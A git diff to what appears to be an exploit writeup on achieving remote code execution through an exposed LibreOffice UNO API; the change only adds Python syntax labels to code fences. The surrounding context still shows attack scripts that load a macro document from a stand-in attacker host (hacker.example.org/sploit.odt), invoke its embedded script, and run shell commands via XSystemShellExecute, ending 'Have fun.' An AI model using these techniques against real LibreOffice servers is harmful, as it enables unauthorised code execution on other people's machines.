@@ -26,7 +26,7 @@ Assign your macro to document opening function via *Tools -> Customize -> Open D
 
 You don't need to upload your document with macro to host running LibreOffice, you can call it by URL instead.
 
-``` 
+```python
 #!/usr/bin/env python3
 import uno
 docurl = "http://hacker.example.org/sploit.odt"
@@ -50,7 +50,7 @@ document.dispose()
  
 Create a document with macro as in previous method, then directly call a macro inside the document with *getScript* and *invoke*.
 
-```
+```python
 #!/usr/bin/env python3
 import uno
 docurl = "http://hacker.example.org/sploit.odt"
@@ -73,7 +73,7 @@ document.dispose()
 
 The best way to execute your command is to use *execute* method of *XSystemShellExecute* interface of API. You don't even need to create a document to use it.
 
-```
+```python
 #!/usr/bin/env python3
 import uno
 from com.sun.star.beans import PropertyValue
@@ -85,3 +85,6 @@ rc.execute("/usr/bin/touch", "/tmp/PWNED", 1)
 ```
 
 Have fun.
+
+
+
